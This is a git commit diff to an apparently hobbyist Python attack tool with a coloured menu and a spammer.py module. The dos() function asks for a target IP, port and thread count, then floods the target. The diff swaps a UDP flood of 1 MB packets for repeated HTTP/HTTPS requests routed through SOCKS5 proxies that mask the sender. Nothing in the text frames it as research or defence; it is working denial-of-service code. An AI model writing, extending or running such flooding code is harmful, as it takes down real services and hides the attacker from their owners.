8d9033a3c2a6efb9ae41ffcdacec661e30291d9e
tae <x1337@taes-Laptop.local>
2024-10-20 19:26:28 +0200

    a

--- func.py
+++ func.py
@@ -8,5 +8,5 @@ def menu():
             print(Fore.MAGENTA, ascii_content)
     print("\n")
     print(f"{Fore.CYAN}[0] - {Fore.WHITE}Panic   {Fore.MAGENTA}[1] - {Fore.WHITE}Start   {Fore.CYAN}[2] - {Fore.WHITE}Proxies    {Fore.MAGENTA}[3] - {Fore.WHITE}Ping")
-    print(f"{Fore.WHITE}[4] - {Fore.CYAN}WhoIs?   {Fore.WHITE}[5] - {Fore.MAGENTA}Layer   {Fore.WHITE}[6] - {Fore.CYAN}Unsafe Mode    {Fore.WHITE}[8] - {Fore.MAGENTA}Credits")
+    print(f"{Fore.WHITE}[4] - {Fore.CYAN}WhoIs?   {Fore.WHITE}[5] - {Fore.MAGENTA}Layers   {Fore.WHITE}[6] - {Fore.CYAN}Unsafe Mode    {Fore.WHITE}[8] - {Fore.MAGENTA}Credits")
     print("\n")
--- spammer.py
+++ spammer.py
@@ -1,8 +1,10 @@
-import socket
+import requests
 import os
 from colorama import Fore
 import platform
 from threading import Thread
+import socks
+import socket
 
 def clear():
     if platform.system() == 'Windows':
@@ -16,29 +18,24 @@ def dos():
     ip = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
     print("Cern@admin-[$]> Enter Target Port ")
     port = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
-    print("Cern@admin-[$]> Enter Number of Threads ")
+    protocol = input("Do you want to use HTTP or HTTPS proxies? (HTTP/HTTPS): ")
+    print("Cern@admin-[$]> Enter Number of Threads (1mb/request)")
     threads = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
-    print("Cern@admin-[$]> Enter Number of Requests ")
-    requests = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
-    print("Cern@admin-[$]> Enter Stress Length")
+    print("Cern@admin-[$]> How many iterations ? (threads*iterations)*1/mb)")
     length = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
+
     def singlerequest():
-            with open("proxy.txt", "r") as file:
-                proxy = file.read().strip()
-                proxies = {
-                'http': f'socks4://{proxy}',
-                'https': f'socks5://{proxy}'
-            }
+        with open("proxy.txt", "r") as file:
+            proxy = file.read().strip()
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy)
+            socket.socket = socks.socksocket
             for _ in range(int(length)):
                 try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.settimeout(6)
-                    sock.sendto(b'A' * 1048576, (ip, int(port)))
+                    response = requests.get(f"http{'s' if protocol.lower() == 'https' else ''}://{ip}:{port}")
                     print(f"Cern@admin-[$]> Sent request to {ip} on port {port}")
                 except:
                     print(f"Cern@admin-[$]> Failed to send request to {ip} on port {port}")
-                finally:
-                    sock.close()
+
     threads_list = []
     for _ in range(int(threads)):
         t = Thread(target=singlerequest)
